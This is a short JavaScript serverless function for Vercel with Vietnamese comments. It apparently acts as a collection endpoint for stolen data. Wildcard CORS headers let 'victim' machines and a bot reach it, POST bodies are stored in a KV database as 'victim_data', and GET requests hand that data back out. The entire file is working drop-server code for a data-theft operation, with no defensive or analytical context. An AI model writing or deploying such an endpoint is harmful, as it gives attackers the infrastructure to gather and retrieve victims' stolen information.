import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  // Cấu hình để máy nạn nhân và Bot đều gọi được link này
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    if (req.method === 'POST') {
      const data = req.body;
      // Lưu dữ liệu vào Database KV
      await kv.set('victim_data', data);
      return res.status(200).json({ status: 'success' });
    }

    // Nếu là GET: Lấy dữ liệu ra
    const data = await kv.get('victim_data');
    return res.status(200).json(data || { message: "Chua co du lieu" });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
